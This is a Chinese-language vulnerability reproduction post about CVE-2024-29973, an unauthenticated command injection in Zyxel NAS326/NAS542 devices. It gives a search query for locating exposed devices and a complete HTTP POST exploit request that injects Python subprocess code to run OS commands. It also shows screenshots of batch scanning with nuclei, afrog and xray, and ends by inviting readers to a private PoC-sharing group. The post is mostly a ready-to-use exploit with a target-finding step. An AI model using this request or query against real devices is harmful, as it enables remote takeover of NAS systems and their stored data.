#  【漏洞复现】Zyxel NAS设备 setCookie 未授权命令注入漏洞(CVE-2024-29973)   
 骇客安全   2025-04-19 03:40  
  
**0x01 产品简介**  
  
Zyxel-NAS 是指由 Zyxel Communications Corporation（合勤科技股份有限公司）开发和生产的网络附加存储（Network Attached Storage，简称 NAS）设备。NAS 是一种专门用于存储和共享文件的设备，它通过网络连接到计算机、服务器或其他设备，提供集中式的文件存储和访问功能。  
  
  
**0x02 漏洞概述**  
  
Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致未经身份验证的远程攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。  
  
  
**0x03 搜索语法**  
```
body="/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMYMDmKkqNtWGfEycx9oxuYK7ZiaPcbkOLmfV3jZX5C3GvKSq1P6icCFkQ/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
 
------WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="c0"
 
storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
------WebKitFormBoundaryHHaZAYecVOf5sfa6--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMGsgV9KNNjqaCGzudPZ2jNt5mZvTOMdbIVodJmjzRgH9zwGNEZ8icibRA/640?wx_fmt=png&from=appmsg "")  
  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMR4bXqcHumf8ad4b4nxUWk40ov0ibeiasiaQOsONicx6ia5lEcibcQSUGTbicQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMSUASqYiaVb5mg6Ricl6DXTS0N6SgQKpff2ET5TyBT1wf62qSNd6QFQug/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMvLxqR8R6ZbrLqrJ1KJWvy7Zg3IeFZgSK6AL5gEozIHNNribIsdkpCPA/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKQjWHb9JHqq1xwAsB6JWYMuXiaXibicEcfvzGQ8RGA92RictFOTiceecibELDK8JNAic6JgMN8icJY3Yzib3w/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
